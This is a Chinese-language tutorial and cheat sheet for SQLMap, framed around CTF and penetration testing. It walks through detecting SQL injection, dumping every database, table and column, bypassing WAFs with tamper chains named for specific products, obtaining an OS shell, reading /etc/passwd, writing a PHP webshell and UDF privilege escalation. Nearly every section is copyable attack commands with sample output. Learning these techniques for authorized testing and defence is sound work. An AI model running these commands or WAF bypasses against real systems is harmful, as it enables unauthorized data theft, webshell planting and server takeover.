# SQLMap 实战使用指南

> 自动化 SQL 注入神器——从检测注入点到脱库脱表，从绕过 WAF 到 OS Shell，每个场景都有可复制的命令。CTF Web 方向、渗透测试实战的标配。

---

## 目录

- [一、SQLMap 是什么](#一sqlmap-是什么)
- [二、安装与环境配置](#二安装与环境配置)
- [三、核心工作流总览](#三核心工作流总览)
- [四、注入检测与等级](#四注入检测与等级)
- [五、爆库 → 爆表 → 爆字段 → 爆数据](#五爆库--爆表--爆字段--爆数据)
- [六、不同注入点位置（GET / POST / Cookie / Header）](#六不同注入点位置get--post--cookie--header)
- [七、tamper 绕过 WAF](#七tamper-绕过-waf)
- [八、OS Shell 与文件操作](#八os-shell-与文件操作)
- [九、进阶技巧](#九进阶技巧)
- [十、实战技巧与注意事项](#十实战技巧与注意事项)
- [十一、速查表](#十一速查表)

---

## 一、SQLMap 是什么

SQLMap 是一款开源的自动化 SQL 注入检测与利用工具。它的核心能力：**给一个 URL 或请求，自动判断是否存在注入、识别注入类型、然后脱库脱表脱数据，甚至写文件、拿 Shell**。

在 CTF 与安全工作中的典型场景：

- Web 题：注入点检测、脱 flag、绕 WAF
- 渗透测试：验证注入漏洞、评估数据泄露风险
- 应急响应：确认被注入的具体数据范围

### SQLMap vs 手工注入

| 维度 | SQLMap | 手工注入 |
|------|--------|----------|
| 速度 | 快（自动化） | 慢（逐字符二分） |
| 灵活性 | 标准场景强，复杂场景需调参 | 完全可控 |
| WAF 绕过 | 内置 tamper | 手工构造 payload |
| 适用 | 标准 GET/POST 注入 | 非常规注入点、SQLMap 识别失败时 |

> 💡 **建议**：先用 SQLMap 跑，跑不通再手工。CTF 题常故意构造 SQLMap 识别不了的注入点，必须手工。

---

## 二、安装与环境配置

```bash
# Kali Linux — 已预装
sqlmap --version

# 其他 Linux / macOS / Windows
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap
cd ~/sqlmap
python3 sqlmap.py --version

# 或 pip 安装（不推荐，版本可能滞后）
pip3 install sqlmap

# 建议做个别名
# Linux/macOS: 加到 ~/.bashrc
alias sqlmap='python3 ~/sqlmap/sqlmap.py'

# Windows: 加环境变量或建 sqlmap.bat
@echo off
python3 C:\sqlmap\sqlmap.py %*
```

### 依赖

```bash
# Python 3.7+
python3 --version

# 可选：让 SQLMap 用第三方库加速
pip3 install psycopg2-binary pymysql pyodbc
```

---

## 三、核心工作流总览

拿到一个可能的注入点，标准流程：

1. **判断注入点**：`sqlmap -u URL --batch`（`--batch` 用默认选项，不交互）
2. **看数据库类型**：输出会显示"back-end DBMS: MySQL"
3. **爆库**：`--dbs` 列出所有数据库
4. **爆表**：`-D dbname --tables` 列出指定库的表
5. **爆字段**：`-D dbname -T tablename --columns` 列出字段
6. **爆数据**：`-D dbname -T tablename -C col1,col2 --dump` 导出数据
7. **进阶**（必要时）：`--os-shell` 拿 Shell、`--file-write` 写文件

### 常用全局参数

```bash
-u URL            # 目标 URL
--data="..."      # POST 数据
--cookie="..."    # Cookie
--headers="..."   # 自定义请求头
--batch           # 不交互，全用默认
--random-agent    # 随机 User-Agent
--proxy="..."     # 走代理（配合 Burp）
--level=N         # 检测等级 1-5（默认 1）
--risk=N          # 风险等级 1-3（默认 1）
--threads=N       # 并发数（默认 1，建议 4-10）
--flush-session   # 清空会话缓存重新测
```

---

## 四、注入检测与等级

### 1. 基础检测

```bash
# 最简单的检测
sqlmap -u "http://target.com/page.php?id=1" --batch

# 输出会告诉你：
# [INFO] testing 'id' parameter for SQL injection
# [INFO] GET parameter 'id' appears to be injectable
# [INFO] back-end DBMS: MySQL >= 5.0
# [INFO] SQL injection vulnerability exists
```

### 2. level（检测等级 1-5）

等级越高，测试的 payload 越多，能发现更多注入点，但耗时越长：

| level | 测试范围 |
|-------|----------|
| 1（默认） | GET/POST 参数 |
| 2 | 加上 Cookie |
| 3 | 加上 User-Agent / Referer |
| 4 | 加上更多 Header |
| 5 | 全部 Header + HOST |

```bash
# 默认测 GET 参数
sqlmap -u "URL?id=1" --batch

# 加测 Cookie
sqlmap -u "URL?id=1" --level=2 --batch

# 全方位测（慢但全）
sqlmap -u "URL?id=1" --level=5 --batch
```

### 3. risk（风险等级 1-3）

风险等级越高，测试的 payload 越激进，可能修改数据（如 UPDATE/DELETE）：

| risk | 测试内容 |
|------|----------|
| 1（默认） | 无害的布尔/时间盲注 |
| 2 | 加上基于大量测试的 OR 注入 |
| 3 | 加上 OR 类的 UPDATE/DELETE 测试（危险） |

```bash
# 默认无害
sqlmap -u "URL?id=1" --risk=1

# 激进（生产环境慎用）
sqlmap -u "URL?id=1" --risk=3
```

> ⚠️ **生产环境永远用 risk=1**。CTF 可以 risk=3 但可能触发题目防护。

### 4. 识别注入类型

SQLMap 会自动尝试多种注入：

- 布尔盲注（Boolean-based blind）
- 时间盲注（Time-based blind）
- 报错注入（Error-based）
- 联合查询（UNION query）
- 堆叠查询（Stacked queries）

```bash
# 只测特定类型（加速）
sqlmap -u "URL?id=1" --technique=BEU    # B=布尔 E=报错 U=UNION
# 默认全部 BEUSTQ
```

### 5. 强制指定数据库类型

```bash
# 已知是 MySQL，跳过其他检测
sqlmap -u "URL?id=1" --dbms=mysql

# 支持的：mysql, mssql, oracle, postgresql, sqlite, access, ...
```

---

## 五、爆库 → 爆表 → 爆字段 → 爆数据

### 1. 爆当前数据库与用户

```bash
sqlmap -u "URL?id=1" --current-db     # 当前库
sqlmap -u "URL?id=1" --current-user   # 当前用户
sqlmap -u "URL?id=1" --is-dba         # 是否 DBA 权限
```

### 2. 爆所有数据库

```bash
sqlmap -u "URL?id=1" --dbs

# 输出：
# available databases [3]:
# [*] information_schema
# [*] ctf_db
# [*] test
```

### 3. 爆表

```bash
sqlmap -u "URL?id=1" -D ctf_db --tables

# 输出：
# Database: ctf_db
# [2 tables]
# +-------+
# | flag  |
# | users |
# +-------+
```

### 4. 爆字段

```bash
sqlmap -u "URL?id=1" -D ctf_db -T flag --columns

# 输出：
# Database: ctf_db
# Table: flag
# [2 columns]
# +--------+-------------+
# | Column | Type        |
# +--------+-------------+
# | id     | int(11)     |
# | flag   | varchar(50) |
# +--------+-------------+
```

### 5. 爆数据

```bash
# 爆指定字段
sqlmap -u "URL?id=1" -D ctf_db -T flag -C flag --dump

# 爆全表
sqlmap -u "URL?id=1" -D ctf_db -T flag --dump

# 爆指定行
sqlmap -u "URL?id=1" -D ctf_db -T flag --start=1 --stop=3 --dump

# 只爆符合条件
sqlmap -u "URL?id=1" -D ctf_db -T flag --where="id=1" --dump
```

### 6. 一键全流程

```bash
# 直接脱所有库所有表（慎用，慢且数据量大）
sqlmap -u "URL?id=1" --dump-all --exclude-sysdbs
```

### 7. 搜索关键字段

```bash
# 搜所有库的表名包含 user
sqlmap -u "URL?id=1" --search -T user

# 搜所有库的字段名包含 pass
sqlmap -u "URL?id=1" --search -C pass
```

### 8. 脱库结果存放

SQLMap 默认把结果存到 `~/.local/share/sqlmap/output/目标域名/`，CSV 格式，可后续查看。

```bash
# 查看历史结果
ls ~/.local/share/sqlmap/output/target.com/dump/
```

---

## 六、不同注入点位置（GET / POST / Cookie / Header）

### 1. GET 注入

最常见，直接 `-u`：

```bash
sqlmap -u "http://target.com/page.php?id=1&name=test" --batch
# SQLMap 自动测所有 GET 参数
```

### 2. POST 注入

```bash
# 方式1：--data
sqlmap -u "http://target.com/login.php" \
    --data="user=admin&pass=123" --batch

# 方式2：从文件读请求（推荐，配合 Burp）
# Burp 抓包 → 右键 → Copy to file → 保存为 req.txt
sqlmap -r req.txt --batch
```

### 3. 指定注入参数

```bash
# 只测 user 参数
sqlmap -u "URL" --data="user=admin&pass=123" -p user

# 排除某参数
sqlmap -u "URL" --data="user=admin&pass=123" --skip="pass"
```

### 4. Cookie 注入

```bash
# 方式1：--cookie
sqlmap -u "http://target.com/page.php?id=1" \
    --cookie="id=1; session=abc" -p id --level=2

# 方式2：从请求文件
sqlmap -r req.txt --level=2
```

### 5. Header 注入（User-Agent / Referer）

需要 `--level=3` 才测 Header：

```bash
sqlmap -u "URL" --level=3 --batch
# 或指定参数
sqlmap -u "URL" --level=3 -p "User-Agent"
```

### 6. 配合 Burp 抓包（最通用）

最推荐的方式，能处理任意复杂请求：

1. 浏览器配 Burp 代理
2. 在网页上操作触发请求
3. Burp 的 Proxy → HTTP History → 找到该请求
4. 右键 → Copy to file → 保存为 `req.txt`（含完整请求头和 body）
5. 跑 SQLMap：

```bash
sqlmap -r req.txt --batch
# 可加 -p 指定参数，或 --level=N
```

### 7. 请求需要登录

```bash
# 方式1：Cookie
sqlmap -u "URL" --cookie="session=xxx; token=yyy"

# 方式2：从请求文件（含 Cookie）
sqlmap -r req.txt

# 方式3：自动登录（需写脚本，不推荐）
```

---

## 七、tamper 绕过 WAF

WAF（Web 应用防火墙）会拦截 SQL 注入特征，tamper 脚本对 payload 做变换绕过。

### 1. 使用 tamper

```bash
# 单个 tamper
sqlmap -u "URL?id=1" --tamper=space2comment

# 多个 tamper 组合
sqlmap -u "URL?id=1" --tamper=space2comment,between,charencode

# 列出所有 tamper
sqlmap --list-tampers
```

### 2. 常用 tamper 速查

| tamper | 作用 | 适用数据库 |
|--------|------|-----------|
| `space2comment` | 空格→`/**/` | 通用 |
| `space2plus` | 空格→`+` | 通用 |
| `space2dash` | 空格→`--` | 通用 |
| `between` | `>`→`BETWEEN` | 通用 |
| `charencode` | URL 编码 | 通用 |
| `charunicodeencode` | Unicode URL 编码 | 通用 |
| `randomcase` | 随机大小写 | 通用 |
| `greatest` | `>`→`GREATEST` | 通用 |
| `apostrophemask` | `'`→`%EF%BC%87` | 通用 |
| `modsecurityversioned` | 空格→`/*!版本*/` | MySQL |
| `modsecurityzeroversioned` | 空格→`/*!00000*/` | MySQL |
| `halfversionedmorekeywords` | 关键字加版本注释 | MySQL |
| `versionedmorekeywords` | 关键字加版本注释 | MySQL |
| `unionalltounion` | `UNION ALL`→`UNION` | 通用 |
| `concat2concatws` | `CONCAT`→`CONCAT_WS` | MySQL |
| `base64encode` | Base64 编码 | 通用 |
| `equaltolike` | `=`→`LIKE` | 通用 |
| `percentage` | 每字符前加 `%` | ASP / IIS |
| `sp_password` | 末尾加 `sp_password` 隐藏日志 | MSSQL |

### 3. 常见 WAF 绕过组合

```bash
# 安全狗 / 云锁类（MySQL）
sqlmap -u "URL" --tamper=space2comment,modsecurityversioned,randomcase,charencode

# ModSecurity
sqlmap -u "URL" --tamper=space2plus,between,randomcase,charunicodeencode

# 通用保守组合（先试这个）
sqlmap -u "URL" --tamper=space2comment,between,randomcase

# ASP + IIS
sqlmap -u "URL" --tamper=percentage,charencode
```

### 4. 自定义 tamper

在 `sqlmap/tamper/` 下新建 `mytamper.py`：

```python
#!/usr/bin/env python3
"""
自定义 tamper 示例：把 SELECT 替换成 SeLeCt
"""
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    payload: 原始 SQL 注入 payload
    返回: 变换后的 payload
    """
    if payload:
        payload = payload.replace("SELECT", "SeLeCt")
        payload = payload.replace("AND", "aNd")
        payload = payload.replace("OR", "oR")
    return payload
```

使用：

```bash
sqlmap -u "URL" --tamper=mytamper
```

---

## 八、OS Shell 与文件操作

需要 DBA 权限（`--is-dba` 返回 True）才能用。

### 1. 拿 OS Shell

```bash
# 拿 Shell（最危险也最强）
sqlmap -u "URL?id=1" --os-shell

# 原理：通过 SQL 的文件写入（MySQL 的 INTO OUTFILE）写一个 webshell 到 Web 目录
# 然后通过这个 webshell 执行系统命令
```

交互式 Shell，可执行 `ls`、`cat /flag`、`whoami` 等。

### 2. 一次执行命令

```bash
sqlmap -u "URL?id=1" --os-cmd="cat /flag"
```

### 3. 写文件

```bash
# 上传本地文件到目标
sqlmap -u "URL?id=1" --file-write="./shell.php" --file-dest="/var/www/html/shell.php"
```

### 4. 读文件

```bash
# 读取目标文件（需要知道路径和权限）
sqlmap -u "URL?id=1" --file-read="/etc/passwd"
sqlmap -u "URL?id=1" --file-read="/flag"
```

### 5. SQL Shell

```bash
# 直接进入 SQL 交互式 Shell（不是 OS Shell）
sqlmap -u "URL?id=1" --sql-shell
# 可输入 SELECT * FROM flag; 等查询
```

### 6. 提权

```bash
# 尝试 UDF 提权（MySQL，写入自定义函数）
sqlmap -u "URL?id=1" --udf-inject

# 注册 sys_eval / sys_exec 函数执行系统命令
```

---

## 九、进阶技巧

### 1. 二阶注入

数据存入数据库后，在另一处查询时触发注入。SQLMap 需要配置请求流程：

```bash
# 用 --second-url 指定触发注入的页面
sqlmap -r req.txt --second-url="http://target.com/profile.php"
```

### 2. 伪静态注入

URL 看似无参数（如 `/news/1.html`），实际注入点在路径里：

```bash
# 用 * 标记注入点
sqlmap -u "http://target.com/news/1*.html"
# SQLMap 会在 * 位置注入
```

### 3. 限制并发避免触发 WAF

```bash
sqlmap -u "URL" --delay=2         # 每次请求间隔 2 秒
sqlmap -u "URL" --timeout=30      # 超时 30 秒
sqlmap -u "URL" --retries=5       # 重试 5 次
```

### 4. 指定后端数据库版本

```bash
# 已知 MySQL 5.7
sqlmap -u "URL" --dbms="MySQL" --version=">=5.7"
```

### 5. 自定义注入标记

```bash
# 告诉 SQLMap 注入点位置
sqlmap -u "URL?id=1*"     # 在 id 参数后注入
```

### 6. 测试结果回滚

```bash
# 清除会话缓存（重新测试）
sqlmap -u "URL" --flush-session

# 继续上次会话
sqlmap -u "URL" --resume
```

### 7. 输出详细日志

```bash
sqlmap -u "URL" -v 6     # 0-6，6 最详细（显示所有请求响应）
# -v 1: 默认
# -v 2: 显示 payload
# -v 3: 显示注入 payload
# -v 6: 显示所有 HTTP 流量
```

---

## 十、实战技巧与注意事项

### 1. CTF SQL 注入标准流程

1. 先手工试 `'` 看是否报错 → 判断字符型/数字型
2. `sqlmap -u "URL" --batch --random-agent` 跑检测
3. 识别不了 → `--level=3 --risk=2` 提升等级
4. 还识别不了 → 换 `--technique` 或手工注入
5. 有 WAF → 加 `--tamper=space2comment,between,randomcase`
6. 找到 flag 表 → `--dump` 脱库
7. 库里没 flag → 试 `--os-shell` 或 `--file-read=/flag`

### 2. SQLMap 识别失败的常见原因

- **非常规注入点**：JSON body、SOAP、GraphQL → 手工或写自定义脚本
- **强 WAF**：换 tamper 组合，或改用 `sqlmap --second-url` 二阶注入
- **注入需要特定前缀/后缀**：用 `--prefix` 和 `--suffix`
  ```bash
  sqlmap -u "URL" --prefix="'))" --suffix="-- -"
  ```
- **编码问题**：参数被 base64/双重 URL 编码 → 用 tamper 处理

### 3. 配合 Burp 使用

最推荐的工作流：

1. Burp 抓包，确保请求能正常返回
2. 右键 → Copy to file → `req.txt`
3. `sqlmap -r req.txt --batch --random-agent`
4. SQLMap 走 Burp 代理（方便观察）：`--proxy="http://127.0.0.1:8080"`

### 4. 避免触发防护

```bash
# 慢速 + 低并发 + 随机 UA
sqlmap -u "URL" --delay=1 --threads=1 --random-agent

# 不要用 risk=3（除非确认无害）
```

### 5. 常见踩坑

- **`--batch` 不交互但用默认值**：某些选项默认 No，需要时单独加（如 `--dump`）
- **会话缓存干扰**：改了参数后旧结果还在，用 `--flush-session`
- **HTTPS 证书错误**：加 `--skip-urlencode` 或 `--unsafe`
- **结果乱码**：`--charset=utf-8` 指定编码
- **POST 数据有特殊字符**：用 `--data` 时注意引号转义，或改用 `-r`

---

## 十一、速查表

### 常用参数速查

```bash
# 检测
sqlmap -u "URL" --batch                          # 基础检测
sqlmap -u "URL" --batch --level=3 --risk=2       # 提升等级
sqlmap -u "URL" --dbms=mysql                     # 指定数据库
sqlmap -u "URL" --technique=BEU                  # 指定注入类型

# 信息收集
sqlmap -u "URL" --current-db                     # 当前库
sqlmap -u "URL" --current-user                   # 当前用户
sqlmap -u "URL" --is-dba                         # 是否 DBA
sqlmap -u "URL" --dbs                            # 所有库
sqlmap -u "URL" -D db --tables                   # 库的表
sqlmap -u "URL" -D db -T tbl --columns           # 表的字段
sqlmap -u "URL" -D db -T tbl --dump              # 脱全表
sqlmap -u "URL" -D db -T tbl -C c1,c2 --dump     # 脱指定字段
sqlmap -u "URL" --dump-all --exclude-sysdbs      # 脱所有库
sqlmap -u "URL" --search -C pass                 # 搜含 pass 的字段

# 注入点
sqlmap -u "URL?id=1"                             # GET
sqlmap -u "URL" --data="a=1&b=2"                 # POST
sqlmap -r req.txt                                # 从文件读请求
sqlmap -u "URL" --cookie="..." -p id --level=2   # Cookie 注入
sqlmap -u "URL" --level=3 -p "User-Agent"        # Header 注入
sqlmap -u "http://target/news/1*.html"           # 伪静态

# 绕过
sqlmap -u "URL" --tamper=space2comment,between,randomcase
sqlmap -u "URL" --random-agent --delay=1 --threads=1

# 进阶
sqlmap -u "URL" --os-shell                       # 拿 Shell
sqlmap -u "URL" --os-cmd="cat /flag"             # 执行命令
sqlmap -u "URL" --file-read="/flag"              # 读文件
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/s.php"
sqlmap -u "URL" --sql-shell                      # SQL 交互
sqlmap -u "URL" --udf-inject                     # UDF 提权

# 调试
sqlmap -u "URL" -v 6                             # 最详细日志
sqlmap -u "URL" --flush-session                  # 清缓存
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"  # 走 Burp
```

### tamper 常用组合速查

```bash
# 通用保守组合（先试这个）
--tamper=space2comment,between,randomcase

# MySQL + ModSecurity
--tamper=space2comment,modsecurityversioned,randomcase,charencode

# MySQL + 安全狗
--tamper=space2comment,halfversionedmorekeywords,randomcase

# 通用激进（编码绕过）
--tamper=charunicodeencode,between,randomcase

# ASP / IIS
--tamper=percentage,charencode

# MSSQL
--tamper=sp_password,space2comment,between
```

### 注入类型速查

| 类型 | technique | 特征 | 速度 |
|------|-----------|------|------|
| 联合查询 | U | UNION SELECT 直接回显 | 最快 |
| 报错注入 | E | 页面显示数据库错误 | 快 |
| 布尔盲注 | B | 页面有真/假两种状态 | 慢 |
| 时间盲注 | T | 用 sleep 控制响应时间 | 最慢 |
| 堆叠查询 | S | 支持 ; 执行多语句 | 看场景 |
| 内联查询 | Q | 在 SQL 内嵌套查询 | 看场景 |
